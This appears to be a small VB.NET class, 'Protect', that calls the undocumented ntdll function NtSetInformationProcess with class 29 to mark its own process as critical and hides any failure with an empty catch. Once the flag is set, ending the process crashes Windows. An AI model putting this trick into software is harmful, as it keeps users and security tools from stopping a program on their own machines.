Imports System.Runtime.InteropServices

Public Class Protect
    <DllImport("ntdll")> _
    Private Shared Function NtSetInformationProcess(ByVal hProcess As IntPtr, ByVal processInformationClass As Integer, ByRef processInformation As Integer, ByVal processInformationLength As Integer) As Integer
    End Function

    Shared Sub pr(ByVal i As Integer)
        Try
            NtSetInformationProcess(Process.GetCurrentProcess.Handle, 29, i, 4)
        Catch ex As Exception
        End Try
    End Sub
End Class
